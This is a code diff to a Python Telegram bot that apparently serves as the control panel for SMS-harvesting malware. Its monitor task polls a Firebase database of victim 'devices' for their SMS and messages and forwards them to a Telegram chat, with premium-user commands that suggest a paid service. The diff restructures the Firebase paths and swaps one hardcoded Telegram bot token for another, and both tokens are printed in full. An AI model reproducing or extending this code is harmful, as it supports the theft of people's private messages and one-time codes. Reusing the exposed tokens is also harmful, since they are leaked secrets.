@@ -94,10 +94,7 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     url = context.args[0].replace('.json', '').rstrip('/')
-    if not url.endswith('/clients'):
-        firebase_base = f"{url}/user_data"
-    else:
-        firebase_base = url
+    firebase_base = f"{url}/user_data"
         
     await update.message.reply_text('✅ Firebase Connect Successfully!\n\nNext Step: /setdevice command use karein.')
 
@@ -195,7 +192,7 @@ async def monitor_task(chat_id, context):
             last_sms_key = list(sms_data.keys())[-1]
 
         msg_data = requests.get(
-            f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
+            f"{firebase_base}/{selected_device_id}/messages.json"
         ).json()
         if msg_data and isinstance(msg_data, dict):
             last_msg_key = list(msg_data.keys())[-1]
@@ -234,7 +231,7 @@ async def monitor_task(chat_id, context):
                     await context.bot.send_message(chat_id=chat_id, text=text)
 
             msg_data = requests.get(
-                f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
+                f"{firebase_base}/{selected_device_id}/messages.json"
             ).json()
 
             if msg_data and isinstance(msg_data, dict):
@@ -301,7 +298,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
 if __name__ == '__main__':
-    TOKEN = '8625469610:AAE2R7UpGmuyC7atp7xvX3f8Lns-u9PmCrE'
+    TOKEN = '8720005848:AAGxPsJFZTG1-4boeVFXoKYOMOK5QMnyuf4'
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("addpremium", add_premium))
